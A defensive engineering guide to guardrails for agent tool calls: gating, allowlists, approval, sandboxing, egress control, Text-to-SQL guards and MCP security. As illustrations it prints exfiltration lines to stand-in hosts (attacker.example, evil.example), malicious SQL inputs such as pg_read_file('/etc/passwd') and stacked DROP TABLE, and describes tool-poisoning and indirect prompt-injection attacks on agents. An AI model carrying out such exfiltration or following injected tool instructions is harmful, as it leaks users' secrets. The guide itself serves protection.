# Tool and Action Guardrails

> **TL;DR**
> - **Gate every tool call in deterministic code.** Check role allowlists, validate arguments, enforce budgets, and require approval before any action runs.
> - **Tier tools by worst-case impact.** Assign read, write, external, and destructive tiers, and bind strict controls and scoped credentials to each tier.
> - **Guard SQL execution at the database and parser.** Combine a read-only database role and RLS with AST parsing, allowlists, row caps, and `EXPLAIN` limits.
> - **Treat MCP servers as untrusted supply-chain inputs.** Pin tool descriptions, allowlist exposed tools per agent, and validate all tool outputs.

**You will learn:** Tool impact tiers, allowlists, and argument validation · Human approval UX, dry runs, and idempotency · Step, cost, and loop budgets plus code sandboxing · Text-to-SQL execution guards and MCP security controls  
**Prerequisites:** [Guardrails architecture](./01-guardrails-architecture.md), [Agentic RAG failure modes](../00-foundations/03-agentic-rag-failure-modes.md)  
**Related:** [Access control & RBAC](./06-access-control-rbac.md), [Threat model & OWASP](./07-threat-model-owasp.md), [Agent tool & trajectory evals](../02-offline-evals/04-agent-tool-and-trajectory-evals.md), [Text-to-SQL evals](../02-offline-evals/05-text-to-sql-evals.md), [Guardrail tools](../06-tooling-landscape/02-guardrail-tools.md)

---

## 1. Why action guardrails are different

Input and output guardrails protect *text*. Action guardrails protect *side effects*, such as reading database rows, creating tickets, sending emails, writing files, or moving money. Three properties distinguish action guardrails from text guardrails:

| Property | Text guardrails | Action guardrails |
|---|---|---|
| Reversibility | The next turn can correct a bad answer | You often cannot undo a deleted row, sent email, or leaked file |
| Who decides | A human reads and judges the model output | The tool executes before any human sees it unless you insert a checkpoint |
| Attack surface | Mostly the user's prompt | User prompt **plus** every retrieved document, tool result, and tool description (indirect prompt injection) |

The core rule follows from these differences:

> **The LLM proposes, and deterministic code disposes.** The model may *suggest* a tool call. A policy layer outside the model's control decides whether the call runs, with what arguments, under whose identity, and within what limits.

That policy layer is the **policy enforcement point (PEP)** for actions. [Access control & RBAC](./06-access-control-rbac.md) applies the same principle to data access.

### Running example

Our internal enterprise assistant exposes nine tools:

| Tool | What it does | Backing system |
|---|---|---|
| `search_docs` | Runs vector search over company documents | Vector store (ACL-filtered) |
| `run_sql` | Executes a generated SQL query against the warehouse | Data warehouse |
| `get_ticket` | Reads a ticket by ID | Ticketing system |
| `create_ticket` | Opens a new ticket | Ticketing system |
| `update_ticket` | Changes status, assignee, or comments on a ticket | Ticketing system |
| `send_email` | Sends an email on the user's behalf | Mail API |
| `fetch_url` | Fetches a web page | Internet via egress proxy |
| `run_python` | Runs analysis code on query results | Sandbox |
| `delete_ticket` | Deletes a ticket | Ticketing system |

Users hold roles such as `employee`, `analyst`, `support_agent`, `hr_partner`, and `admin`.

---

## 2. The tool-call gate: one choke point for every action

Route every tool call through a single gate function. A single choke point makes your policies auditable and testable.

```mermaid
flowchart LR
    A["LLM proposes tool call"] --> B{"Tool allowed for role and context?"}
    B -- no --> X["Deny + structured error to model"]
    B -- yes --> C{"Args valid against schema and policy?"}
    C -- no --> X
    C -- yes --> D{"Within budgets: steps, calls, cost, rate?"}
    D -- no --> Y["Stop run + explain to user"]
    D -- yes --> E{"Tier requires approval?"}
    E -- yes --> F["Preview / dry run shown to user"]
    F -- rejected --> X
    F -- approved --> G["Execute with scoped credentials, timeout, sandbox"]
    E -- no --> G
    G --> H["Validate + sanitize result"]
    H --> I["Audit log"]
    I --> J["Return result to model as untrusted data"]
```

Use a minimal, framework-agnostic Python gate:

```python
from dataclasses import dataclass
from enum import Enum


class Tier(Enum):
    READ = "read"              # no side effects
    WRITE = "write"            # reversible side effects
    DESTRUCTIVE = "destructive"  # irreversible, external, or high-impact


@dataclass
class ToolSpec:
    name: str
    tier: Tier
    roles: set[str]            # roles allowed to call it
    args_model: type           # e.g. a Pydantic model
    needs_approval: bool = False
    max_calls_per_run: int = 10


class Denied(Exception):
    pass


def gate(call, user, run_state, registry: dict[str, ToolSpec]):
    spec = registry.get(call.name)
    if spec is None:
        raise Denied(f"unknown tool {call.name}")            # never trust model-invented names
    if user.role not in spec.roles:
        raise Denied(f"role {user.role} may not call {call.name}")
    args = spec.args_model.model_validate(call.arguments)   # raises on bad args
    run_state.check_budgets(call.name, spec)                # raises BudgetExceeded
    if spec.needs_approval or spec.tier is Tier.DESTRUCTIVE:
        run_state.require_approval(call.name, args)         # pauses the run
    return spec, args
```

Design notes:

- **Return denials to the model as structured tool errors.** Send a clean payload like `{"error": "not_permitted"}` so the model can recover or explain the denial. Never leak internal policy details that help an attacker probe the system.
- **Do not rely on hiding tools from the prompt as a security control.** Filtering unauthorized tools from the prompt reduces confusion and attack surface. However, the gate must still enforce the allowlist because the model can emit any tool name.
- **Enforce the gate on the server side.** Never rely on client-side or prompt-only checks. When you expose tools through MCP or an API, enforce authorization on the server too.

---

## 3. Tool allowlists per role and context

An allowlist defines which tools an agent can invoke **right now**. This decision depends on more than the user's role:

| Dimension | Example rule |
|---|---|
| Role | Only `support_agent` and `admin` may call `update_ticket` |
| Task / agent persona | The "HR policy Q&A" agent gets `search_docs` only, even for admins |
| Data sensitivity in context | Once the context contains `confidential` documents, disable `send_email` and `fetch_url` for the rest of the run (taint tracking, see §11) |
| Channel | Slack bot allows read tools only. Web app with confirmation UI allows write tools |
| Environment | Staging allows `delete_ticket`, whereas production requires human approval |
| Time / state | Disable `run_sql` during warehouse maintenance windows |

Practical defaults:

- [ ] Deny by default so any tool outside the allowlist for this role, agent, and channel is unavailable.
- [ ] Give each agent the smallest tool set required for its job.
- [ ] Split broad agents into narrower ones instead of granting one agent every tool.
- [ ] Prefer narrow, purpose-built tools (`get_ticket(id)`) over generic ones (`http_request(url, method, body)` or `run_shell(cmd)`).
- [ ] Store the allowlist in configuration or a [policy engine](./06-access-control-rbac.md), not in the system prompt.

---

## 4. Argument validation

An allowed tool can still receive dangerous arguments. Validate every argument in code **before** execution.

| Check | Example |
|---|---|
| Type & schema | `ticket_id: int`, `priority: Literal["low","medium","high"]` |
| Ranges | Keep `limit` between 1 and 100. Require `date_from` within the last 2 years |
| Enums instead of free text | Require `status` to match a valid workflow state |
| Format | Match email addresses against a pattern **and** a domain allowlist (`@company.com`) |
| Length | Cap `comment` at 4,000 characters to stop prompt-stuffed payloads and cost spikes |
| Referential / ownership | Confirm that `ticket_id` exists **and** that the user has permission to view it |
| Cross-field | Require `assignee` to belong to the same team as the ticket queue |
| Content | Scan free-text fields with the same PII and secret detectors used in [output guardrails](./04-output-guardrails.md) |
| Injection-sensitive sinks | Never build SQL, shell commands, file paths, or URLs by string concatenation. Use parameterized APIs |

Example with Pydantic (v2 API):

```python
from typing import Literal
from pydantic import BaseModel, EmailStr, Field, field_validator

ALLOWED_EMAIL_DOMAINS = {"company.com"}


class CreateTicketArgs(BaseModel):
    title: str = Field(min_length=5, max_length=200)
    body: str = Field(max_length=4000)
    queue: Literal["it", "facilities", "data-platform"]
    priority: Literal["low", "medium", "high"] = "medium"


class SendEmailArgs(BaseModel):
    to: list[EmailStr] = Field(min_length=1, max_length=5)
    subject: str = Field(max_length=200)
    body: str = Field(max_length=10_000)

    @field_validator("to")
    @classmethod
    def internal_only(cls, v):
        for addr in v:
            if addr.split("@")[-1].lower() not in ALLOWED_EMAIL_DOMAINS:
                raise ValueError(f"external recipient not allowed: {addr}")
        return v
```

(`EmailStr` requires the `email-validator` extra.)

Tips:

- **Use strict structured outputs or schema-constrained tool calling** when your model provider supports it. Constrained decoding reduces syntax errors, but you must still validate semantics and policy rules.
- **Never let the model supply identity or tenant arguments** (`user_id`, `tenant_id`, `as_user`). Inject identity fields from the authenticated session instead.
- **Return validation errors to the model as tool errors and count them.** A spike in validation failures is a valuable [online signal](../03-online-evals-and-observability/01-online-evals.md).

---

## 5. Least privilege and scoped credentials

Scoped tool **credentials** cap the blast radius when other layers fail.

| Practice | What it means in the running example |
|---|---|
| Act on behalf of the user | `get_ticket` calls the ticketing API with an end-user token (OAuth on-behalf-of or token exchange). See [identity propagation](./06-access-control-rbac.md) |
| Narrow scopes | Grant `tickets:read` and `tickets:write` on the ticketing token, but omit `tickets:delete` and `admin:*` |
| Short-lived tokens | Mint tokens for minutes, not months, on each run or call |
| Separate credentials per tool | Give `run_sql` a read-only database role and `create_ticket` a separate credential so one compromise cannot spread |
| No secrets in the context window | Never expose API keys or connection strings to the model. Fetch secrets from a vault at execution time |
| Read-only by default | Split read and write tools (`get_ticket` vs `update_ticket`) so each tool carries distinct scopes |

Anti-patterns:

- Sharing one privileged service account across all tools.
- Passing the user's raw upstream token directly to every downstream API. The [MCP Security Best Practices](https://modelcontextprotocol.io/specification/2025-06-18/basic/security_best_practices) call this **token passthrough** and forbid it. Validate that each token is issued for the specific receiving server.
- Granting broad wildcard scopes to avoid re-consent later. The MCP security guide recommends **scope minimization** instead.

---

## 6. Tool tiers: read, write, destructive

Classify each tool by its worst-case impact, and attach controls to the tier rather than inventing rules per tool.

| Tier | Definition | Examples | Default controls |
|---|---|---|---|
| **T0 Read (internal)** | Produces no side effects and reads only data the user can already access | `search_docs`, `get_ticket`, `run_sql` (SELECT) | Role allowlist, argument validation, row and result caps, audit log |
| **T1 Write (reversible, internal)** | Creates or modifies internal state that an operator can undo | `create_ticket`, `update_ticket` comment | T0 controls + rate limit + idempotency key + undo path + optional approval or inline preview |
| **T2 External / exfiltration-capable** | Sends data outside the trust boundary | `send_email`, `fetch_url` (GET parameters leak data), webhooks | T1 controls + destination allowlist + DLP payload scan + approval when context is tainted |
| **T3 Destructive / high-impact** | Performs irreversible, financial, security-critical, or bulk actions | `delete_ticket`, bulk updates, permission changes, payments, `DROP` | Mandatory human approval, dry-run preview, tight scopes, two-person rule for highest risk, kill switch |

Use a simple heuristic: if you would not let a new intern run the action unsupervised on day one, classify it as T2 or T3.

Remember that **read tools can also exfiltrate data**. A call like `fetch_url("https://attacker.example/?q=<secret>")` is a read operation that leaks secrets. Classify tools by impact, not by HTTP verb.

---

## 7. Human-in-the-loop approval

Human approval hands high-risk decisions to a person. Approval works only when reviewers see enough context to decide and receive few enough prompts to read each one carefully.

### When to require approval

| Require approval | Usually skip approval |
|---|---|
| T3 destructive or irreversible actions | T0 reads within the user's own permissions |
| T2 external sends, especially when context holds untrusted or sensitive data | T1 writes that are low-volume and easy to undo |
| Bulk actions above a threshold (such as > 5 tickets) | Actions that the user explicitly requested *and* that show an inline preview |
| First use of a sensitive tool in a session | Repeated identical low-risk actions after an initial approval |
| Any action triggered by untrusted content rather than the user's prompt | |

The [MCP Tools specification](https://modelcontextprotocol.io/specification/2025-06-18/server/tools) states that a human **SHOULD** always be able to deny tool invocations. Clients **SHOULD** prompt for confirmation on sensitive operations and display tool inputs before calling the server.

### Confirmation UX that works

- [ ] Show the exact action and arguments in plain language, not the model's summary of its plan.
- [ ] Show why the agent wants to run the tool, and flag triggers that came from retrieved content.
- [ ] Highlight specific risks such as external recipients, bulk counts, irreversible changes, or detected sensitive data.
- [ ] Offer **Approve**, **Edit**, and **Reject** options, and re-validate any edited arguments through the gate.
- [ ] Bind each approval to the exact payload hash, and re-prompt if the agent changes any argument.
- [ ] Expire approvals after a short window so old approvals cannot authorize new calls.
- [ ] Route high-risk approvals to a second reviewer, such as a manager or on-call engineer, when appropriate.
- [ ] Track approval rates and latency to catch rubber-stamping ([overwhelming human-in-the-loop](./07-threat-model-owasp.md)).

### Dry run and preview

Implement a `dry_run=True` mode for T1–T3 tools to show *what would happen* without mutating state:

| Tool | Dry-run output |
|---|---|
| `update_ticket` | Diff of fields before and after the change |
| Bulk update | Total count and sample of affected records |
| `run_sql` (if writes were ever allowed) | `EXPLAIN` output and estimated affected rows inside a rolled-back transaction |
| `send_email` | Rendered email body and recipient list |
| Infra/IaC tools | Execution plan diff (such as `terraform plan`) |

Display the dry-run output in the approval UI. Execute the real call only after approval using the exact same arguments.

---

## 8. Idempotency and safe retries

Agents retry, frameworks retry on timeouts, and models repeat calls. Without idempotency, "create ticket" quickly becomes "create three tickets".

- [ ] Generate an idempotency key per intended action (`hash(run_id + tool + normalized_args)`) and pass it downstream.
- [ ] Deduplicate idempotency keys in the tool gate when downstream APIs lack native idempotency support.
- [ ] Design write tools as upserts or state assertions (`set_status(ticket, "closed")`) instead of toggles (`toggle_status`).
- [ ] Record the outcome of every side-effecting call in run state, and never replay completed actions on resume.
- [ ] Distinguish failed calls from unknown timeouts, and check downstream state before retrying an unknown outcome.

---

## 9. Budgets, rate limits, and loop detection

Unbounded agents burn money, overload downstream systems, and enable denial-of-wallet attacks (**LLM10: Unbounded Consumption** in [Threat model & OWASP](./07-threat-model-owasp.md)).

| Budget | Scope | Starting point (heuristic, tune on your traces) | On breach |
|---|---|---|---|
| Max agent steps (LLM turns) | Per run | 10–25 for a Q&A agent | Stop and return a partial answer with "I couldn't finish" |
| Max tool calls | Per run, per tool | 20 total, 5 `run_sql`, 1 `send_email` | Deny further calls to that tool |
| Max tokens / cost | Per run, per user per day | Set to 2–3× the p99 of normal runs | Stop the run and alert on repeated breaches |
| Wall-clock timeout | Per run, per tool call | 60–120 s per run, 10–30 s per tool | Cancel execution and return an error |
| Rate limit | Per user, per tool, per tenant | 10 writes/min per user | Return a 429-style error to the model |
| Result size | Per tool call | Truncate to N rows or N KB before adding to context | Truncate and notify the model that the output was truncated |

### Loop detection

Watch for four common loop patterns:
- Repeating the same tool and arguments.
- Oscillating between two calls (`A → B → A → B`).
- Retrying a failing call with minor edits.
- Re-planning endlessly without calling tools.

```python
from collections import Counter


def detect_loop(history: list[tuple[str, str]], window: int = 6, max_repeats: int = 3) -> bool:
    """history: list of (tool_name, normalized_args_json). Illustrative heuristic."""
    recent = history[-window:]
    counts = Counter(recent)
    if counts and counts.most_common(1)[0][1] >= max_repeats:
        return True                                  # same call repeated
    if len(recent) >= 4 and recent[-1] == recent[-3] and recent[-2] == recent[-4]:
        return True                                  # A-B-A-B oscillation
    return False
```

When the detector catches a loop, stop and summarize, or inject one warning message before hard-stopping on the next repeat. Log every budget and loop breach. Use breach logs to trigger [alerts](../03-online-evals-and-observability/04-monitoring-alerting-and-drift.md) and feed failing traces into your [eval datasets](../01-datasets/04-production-data-flywheel.md).

---

## 10. Sandboxing code execution

If an agent can run code (such as `run_python` for charts and data analysis), assume the code is hostile. A model that reads attacker-controlled content can generate malicious code.

| Control | Detail |
|---|---|
| Isolation boundary | Run code in a separate container, microVM, or WebAssembly runtime. **Never** call `exec()` or `eval()` in your application server |
| No credentials | Mount zero cloud credentials, service tokens, or secrets inside the sandbox |
| Filesystem | Use an ephemeral, read-only base image with a single writable scratch directory that is destroyed after each run |
| Network | **Disable network access by default**. If required, allowlist specific hosts through an egress proxy |
| Resources | Enforce strict CPU, memory, disk, process-count, and wall-clock limits |
| Syscalls / privileges | Run as a non-root user, drop Linux capabilities, and apply `seccomp` syscall filters |
| Inputs | Pass input data as local files instead of letting sandbox code query production databases directly |
| Outputs | Limit output size and check MIME types (such as PNG and JSON only). Treat `stdout` as untrusted text |
| Packages | Pre-install a pinned package set and block runtime `pip install` calls ([LLM03 supply chain](./07-threat-model-owasp.md)) |

Whether you use a managed code interpreter or a dedicated sandbox product, verify the isolation boundary. Confirm that network egress is off by default.

---

## 11. Egress controls and exfiltration channels

Data exfiltration requires an outbound channel. When you remove or gate outbound channels, prompt injection loses most of its impact. Outbound communication is the third leg of the [lethal trifecta](./07-threat-model-owasp.md).

Common outbound channels in an agentic RAG system include:

| Channel | Example attack | Control |
|---|---|---|
| `fetch_url` / browsing tool | `GET https://evil.example/log?d=<base64 secrets>` | Enforce a domain allowlist via an egress proxy, strip query strings, and block when context is tainted |
| Markdown images in the answer | `![](https://evil.example/p.png?d=<secret>)` auto-fetched by the user's browser | Block remote images or allowlist image domains, and set a strict UI Content Security Policy ([output guardrails](./04-output-guardrails.md)) |
| Links | Clickable link carrying leaked data in query parameters | Rewrite or flag external links and display the full URL |
| `send_email`, webhooks, Slack posts | Model emails sensitive data to an external address | Enforce a recipient allowlist, run a DLP scan, and require human approval |
| Ticket or comment creation in shared systems | Agent writes secrets into a widely visible ticket | Scan payloads for sensitive data and match ticket visibility to the requester's permissions |
| Code sandbox with network | Sandbox script posts sensitive data to an external host | Disable sandbox network egress |
| Tool arguments to third-party MCP servers | External server operator logs all tool arguments | Vet MCP servers and send only minimal required fields |

Use **taint tracking** to block exfiltration dynamically. Mark a run as *tainted* when untrusted content enters the context (web pages, external emails, user uploads, third-party tool outputs). Mark the run as *sensitive* when confidential data enters the context. When both flags are set, disable or require approval for every T2 tool. Research systems such as CaMeL formalize this separation ([Debenedetti et al., 2025](https://arxiv.org/abs/2503.18813), [Simon Willison's summary](https://simonwillison.net/2025/Apr/11/camel/)).

```python
def allowed_given_taint(tool: ToolSpec, run_state) -> bool:
    if tool.tier in (Tier.READ, Tier.WRITE):
        return True
    # T2 external / T3 destructive
    if run_state.has_untrusted_content and run_state.has_sensitive_data:
        return False            # or: require approval with a loud warning
    return True
```

---

## 12. Text-to-SQL execution guardrails

Text-to-SQL is the highest-risk read tool in our running example because the model writes code that queries your warehouse. [Text-to-SQL evals](../02-offline-evals/05-text-to-sql-evals.md) cover query accuracy, whereas this section covers *safe execution*.

### Defence in depth

```mermaid
flowchart TD
    Q["Generated SQL"] --> P["1. Parse with a real SQL parser"]
    P --> S{"2. Exactly one statement?"}
    S -- no --> D["Deny"]
    S -- yes --> C{"3. Read-only query type, no DDL/DML/COPY/INTO?"}
    C -- no --> D
    C -- yes --> F{"4. Functions allowlisted?"}
    F -- no --> D
    F -- yes --> T{"5. Tables and columns in role allowlist?"}
    T -- no --> D
    T -- yes --> R["6. Rewrite: enforce LIMIT, inject tenant filter"]
    R --> E{"7. EXPLAIN cost under cap?"}
    E -- no --> D
    E -- yes --> X["8. Execute as read-only DB role, RLS on, statement timeout"]
    X --> O["9. Post-process: row cap, column masking, PII scan"]
```

Treat the **database as the real security boundary** (steps 8–9). Steps 1–7 make failures cheaper and easier to explain to the model. However, a parser guard alone is never enough because parsers and database engines can disagree on edge cases and dialect-specific functions.

### Layer-by-layer checklist

**At the database (non-negotiable):**
- [ ] Create a dedicated database role for the agent with `SELECT` privileges only on approved schemas and views.
- [ ] Grant zero `INSERT`, `UPDATE`, `DELETE`, DDL, or table-ownership privileges to the agent role.
- [ ] Set the session or transaction to read-only (`SET TRANSACTION READ ONLY`), or route queries to a read replica.
- [ ] Configure a strict statement timeout (`statement_timeout` in PostgreSQL or the warehouse equivalent).
- [ ] Enable row-level security for tenant and user scoping ([PostgreSQL RLS](https://www.postgresql.org/docs/current/ddl-rowsecurity.html)), or expose pre-filtered views per tenant.
- [ ] Enforce column-level grants or masking policies on sensitive columns such as salary, SSN, and email.
- [ ] Revoke access to dangerous functions and extensions such as file readers, `dblink`, and `COPY ... TO PROGRAM`.
- [ ] Configure warehouse resource controls, including workload queue limits and per-query bytes-scanned caps.

**In the application guard:**
- [ ] Parse queries with a real SQL parser ([sqlglot](https://github.com/tobymao/sqlglot)) and never rely on regex checks like "starts with SELECT".
- [ ] Allow exactly one statement per call to block stacked queries (`SELECT 1; DROP TABLE ...`).
- [ ] Require the AST root node to be a read query (`SELECT`, `UNION`, CTE) and reject `SELECT ... INTO`.
- [ ] Reject unknown or anonymous functions unless they appear on an explicit allowlist.
- [ ] Validate tables and columns against allowlists derived from the user's role, not the prompt schema.
- [ ] Reject `SELECT *` so queries name every column explicitly for auditing and masking.
- [ ] Enforce or clamp a maximum `LIMIT` on every query.
- [ ] Inject tenant filters in the AST as defense in depth on top of database RLS.
- [ ] Check query cost with `EXPLAIN` before executing the query.
- [ ] Bind application parameters with parameterized queries or AST nodes, and never interpolate raw user strings.

**After execution:**
- [ ] Cap the number of rows and bytes returned to the model.
- [ ] Mask or drop any sensitive columns that slipped through.
- [ ] Log the executed SQL, guardrail verdict, user identity, and returned row count.

### Illustrative SQL guard with sqlglot

> `# illustrative — tested against sqlglot 30.x; check current API for your version.`
> Use this guard as a pre-execution filter alongside a read-only database role and RLS.

```python
from dataclasses import dataclass, field

import sqlglot
from sqlglot import exp
from sqlglot.errors import OptimizeError, ParseError
from sqlglot.optimizer.qualify import qualify

# Schema visible per role: {db: {table: {column: type}}}
ROLE_SCHEMAS = {
    "analyst": {
        "sales": {
            "orders": {"order_id": "INT", "region": "TEXT", "order_date": "DATE",
                       "amount": "DECIMAL", "tenant_id": "INT"},
            "regions": {"region": "TEXT", "manager": "TEXT"},
        },
    },
}
FORBIDDEN = (exp.Insert, exp.Update, exp.Delete, exp.Merge, exp.Create, exp.Drop,
             exp.Alter, exp.TruncateTable, exp.Command, exp.Into)
ALLOWED_UDFS = {"date_trunc"}   # functions sqlglot parses as "anonymous"
MAX_LIMIT = 1000


@dataclass
class Verdict:
    allowed: bool
    reasons: list[str] = field(default_factory=list)
    sql: str | None = None      # rewritten SQL to execute, if allowed


def guard_sql(sql: str, role: str, dialect: str = "postgres") -> Verdict:
    schema = ROLE_SCHEMAS.get(role)
    if not schema:
        return Verdict(False, [f"role {role!r} may not run SQL"])
    try:
        stmts = [s for s in sqlglot.parse(sql, read=dialect) if s is not None]
    except ParseError as e:
        return Verdict(False, [f"parse_error: {e}"])
    if len(stmts) != 1:
        return Verdict(False, [f"expected exactly 1 statement, got {len(stmts)}"])
    tree = stmts[0]

    # 1. Read-only query types only.
    if not isinstance(tree, exp.Query):
        return Verdict(False, [f"statement type {tree.key.upper()} not allowed"])
    if bad := {n.key for n in tree.walk() if isinstance(n, FORBIDDEN)}:
        return Verdict(False, [f"forbidden constructs: {sorted(bad)}"])
    if any(True for _ in tree.find_all(exp.Star)):
        return Verdict(False, ["SELECT * not allowed; name columns explicitly"])

    # 2. Unknown functions (e.g. pg_read_file, dblink).
    reasons = [f"function not allowed: {f.name}"
               for f in tree.find_all(exp.Anonymous)
               if f.name.lower() not in ALLOWED_UDFS]

    # 3. Table allowlist (CTE names are local, skip them).
    ctes = {c.alias_or_name for c in tree.find_all(exp.CTE)}
    for t in tree.find_all(exp.Table):
        if t.name in ctes:
            continue
        if not (t.db in schema and t.name in schema[t.db]):
            reasons.append(f"table not allowed: {t.db + '.' if t.db else ''}{t.name}")
    if reasons:
        return Verdict(False, reasons)

    # 4. Column allowlist: resolve every column against the role's schema only.
    try:
        tree = qualify(tree, schema=schema, dialect=dialect,
                       validate_qualify_columns=True)
    except OptimizeError as e:
        return Verdict(False, [f"column check failed: {e}"])

    # 5. Enforce a row cap on the outermost query.
    limit = tree.args.get("limit")
    try:
        too_big = limit is None or int(limit.expression.name) > MAX_LIMIT
    except (ValueError, AttributeError):
        too_big = True
    if too_big:
        tree = tree.limit(MAX_LIMIT)
    return Verdict(True, [], tree.sql(dialect=dialect))
```

Sample verdicts for the `analyst` role:

| Input | Verdict |
|---|---|
| `SELECT region, SUM(amount) FROM sales.orders GROUP BY region` | Allowed, rewritten with qualified names and `LIMIT 1000` |
| `SELECT region FROM sales.orders LIMIT 5000` | Allowed, limit clamped to 1000 |
| `SELECT 1; DROP TABLE sales.orders` | Denied: 2 statements |
| `DELETE FROM sales.orders` | Denied: statement type DELETE |
| `SELECT region INTO new_t FROM sales.orders` | Denied: `INTO` construct |
| `SELECT salary FROM hr.employees` | Denied: table not allowed |
| `SELECT salary FROM sales.orders` | Denied: column cannot be resolved |
| `... WHERE order_id IN (SELECT order_id FROM hr.employees)` | Denied: table in subquery not allowed |
| `SELECT pg_read_file('/etc/passwd')` | Denied: function not allowed |
| `COPY sales.orders TO '/tmp/x'` | Denied: statement type COPY |

Cover four remaining gaps outside the parser:
- Dialect differences between `sqlglot` and your database engine.
- Built-in functions that `sqlglot` parses natively rather than as `Anonymous`.
- Expensive valid queries (mitigate with `EXPLAIN` limits and statement timeouts).
- Inference attacks via aggregates (mitigate with database RLS and column masking).

### Injecting tenant filters

Enforce row-level security in the database first. As a second layer, rewrite every reference to a tenant-scoped table into a filtered subquery using the tenant ID from the **authenticated session**:

```python
import sqlglot
from sqlglot import exp

TENANT_SCOPED = {("sales", "orders")}


def inject_tenant_filter(sql: str, tenant_id: int, dialect: str = "postgres") -> str:
    """Run AFTER guard_sql. Illustrative."""
    tree = sqlglot.parse_one(sql, read=dialect)

    def wrap(node):
        if isinstance(node, exp.Table) and (node.db, node.name) in TENANT_SCOPED:
            scoped = (exp.select("*")
                      .from_(exp.table_(node.name, db=node.db))
                      .where(exp.column("tenant_id").eq(exp.Literal.number(int(tenant_id)))))
            return scoped.subquery(node.alias_or_name)
        return node

    return tree.transform(wrap).sql(dialect=dialect)

# SELECT o.region FROM sales.orders AS o
# -> SELECT o.region FROM (SELECT * FROM sales.orders WHERE tenant_id = 42) AS o
```

### Cost caps with EXPLAIN

Query the database planner to estimate execution cost before running the SQL:

```python
import json

def explain_cost_ok(cursor, sql: str, max_cost: float = 1e6, max_rows: int = 10_000_000) -> bool:
    """PostgreSQL example. Illustrative; planner costs are relative units, calibrate on your data."""
    cursor.execute("EXPLAIN (FORMAT JSON) " + sql)   # sql already guarded and rewritten
    raw = cursor.fetchone()[0]
    plan = (json.loads(raw) if isinstance(raw, str) else raw)[0]["Plan"]
    return plan["Total Cost"] <= max_cost and plan["Plan Rows"] <= max_rows
```

Cloud warehouses offer similar controls, such as dry-run byte estimates or per-query maximum bytes billed settings. Pair cost estimates with a hard statement timeout.

### Return errors the model can use

Return concise denial messages such as `table not allowed: hr.employees` so the model can retry with an allowed table or explain the limitation. Never list the full schema of forbidden tables in error messages.

---

## 13. MCP-specific concerns

The [Model Context Protocol (MCP)](https://modelcontextprotocol.io/) standardizes how agents discover and invoke tools on external servers. Because MCP makes integration easy, teams can accidentally connect untrusted code and prompt text directly to their agent. Treat every MCP server as a **third-party dependency with prompt-level access to your model**.

### What the spec says

The [MCP Tools specification (2025-06-18)](https://modelcontextprotocol.io/specification/2025-06-18/server/tools) defines requirements for servers and clients:

- Servers **MUST** validate all tool inputs, enforce access controls, rate-limit invocations, and sanitize tool outputs.
- Clients **SHOULD** prompt for confirmation on sensitive operations, display tool inputs before calling the server, validate tool results, enforce timeouts, and log tool usage.
- Clients **MUST** treat tool annotations (such as read-only or destructive hints) as **untrusted** unless they come from a trusted server.

The [MCP Security Best Practices](https://modelcontextprotocol.io/specification/2025-06-18/basic/security_best_practices) cover **confused deputy** attacks in OAuth proxies, **token passthrough** (forbidden), **SSRF**, **session hijacking**, **local server compromise**, and **scope minimization**. Read it alongside the [MCP Authorization specification](https://modelcontextprotocol.io/specification/2025-06-18/basic/authorization).

### Threats to plan for

| Threat | What happens | Mitigations |
|---|---|---|
| **Tool poisoning / tool description injection** | A tool's description contains hidden instructions (such as reading `~/.ssh/id_rsa` and passing it in `notes`). Invariant Labs documented these [tool poisoning attacks](https://invariantlabs.ai/blog/mcp-security-notification-tool-poisoning-attacks) | Review and pin tool descriptions, diff them on server updates, scan descriptions for instructions, and prefer vetted servers |
| **Rug pull / silent redefinition** | A server modifies tool definitions after initial approval | Pin server versions, hash tool manifests, and require re-approval on any change |
| **Tool shadowing / name collision** | A malicious server registers a tool name that collides with a trusted tool or alters how other tools run | Namespace tools per server, reject duplicate names, and isolate high-trust tools from low-trust servers |
| **Indirect injection via tool results** | Tool outputs return attacker-controlled text from issues, web pages, or emails | Treat tool results as untrusted data, apply taint tracking, and require approval for T2/T3 calls after taint ([input guardrails](./02-input-guardrails.md), [retrieval & context guardrails](./03-retrieval-and-context-guardrails.md)) |
| **Over-broad servers** | One server exposes dozens of read, write, and admin tools under a single wide token | Apply a client-side tool allowlist per agent, request minimal scopes, and split servers by privilege |
| **Excess data to third parties** | Tool arguments send sensitive context to a remote server | Send only required fields and check data classification before calling external servers |
| **Local server compromise** | A local `stdio` server executes arbitrary commands with the user's OS privileges | Install only from trusted sources, display the exact command before first run, and sandbox local servers |
| **Token handling** | Token passthrough, confused deputy flaws, or SSRF during auth discovery | Follow the MCP authorization spec and validate token audiences on every server |

### MCP checklist

- [ ] Maintain an approved MCP server registry with source, version, owner, scopes, and tool-list hashes.
- [ ] Enforce a client-side tool allowlist per agent, even when the MCP server exposes additional tools.
- [ ] Treat all MCP tool descriptions, annotations, and results as untrusted model inputs.
- [ ] Route every MCP tool call through your own gate (§2) for role checks, argument validation, budgets, and approval.
- [ ] Separate high-trust tools (internal data, email) from low-trust MCP servers unless taint controls are active.
- [ ] Log every MCP call with server identity, tool name, redacted arguments, and result size.

---

## 14. Policy table for the running example

Use this table as a baseline policy and tune the limits with your security team:

| Tool | Tier | Allowed roles | Key arg constraints | Approval | Budget per run | Credentials | Egress |
|---|---|---|---|---|---|---|---|
| `search_docs` | T0 | all | `query` ≤ 1,000 chars, `top_k` ≤ 20, ACL filter injected from session | No | 10 calls | User identity → ACL pre-filter | None |
| `run_sql` | T0 | `analyst`, `admin` (others: curated views only) | Passes `guard_sql`, ≤ 1,000 rows, EXPLAIN under cap | No | 5 calls, 30 s each | Read-only DB role + RLS keyed on user/tenant | None |
| `get_ticket` | T0 | all | `ticket_id: int`, must be visible to user | No | 20 calls | OBO token `tickets:read` | None |
| `create_ticket` | T1 | all | `queue` enum, `title` 5–200 chars, body PII-scanned | Preview inline, no blocking approval | 2 calls, idempotency key | OBO token `tickets:write` | None |
| `update_ticket` | T1 | `support_agent`, `admin` | `status` enum, only tickets in user's queues | Approval if > 5 tickets or status = `closed` | 10 calls | OBO token `tickets:write` | None |
| `send_email` | T2 | all except `contractor` | Recipients `@company.com` only, ≤ 5 recipients, DLP scan | **Always** (and blocked if context tainted + sensitive) | 1 call | OBO token `mail.send` | Mail API only |
| `fetch_url` | T2 | `analyst`, `admin` | Domain allowlist, no query strings, GET only | Approval if context contains sensitive data | 5 calls | None | Egress proxy, allowlist |
| `run_python` | T1 (sandboxed) | `analyst` | Code ≤ 10 KB, inputs passed as files | No | 3 calls, 60 s, 1 GB RAM | **None** | **Disabled** |
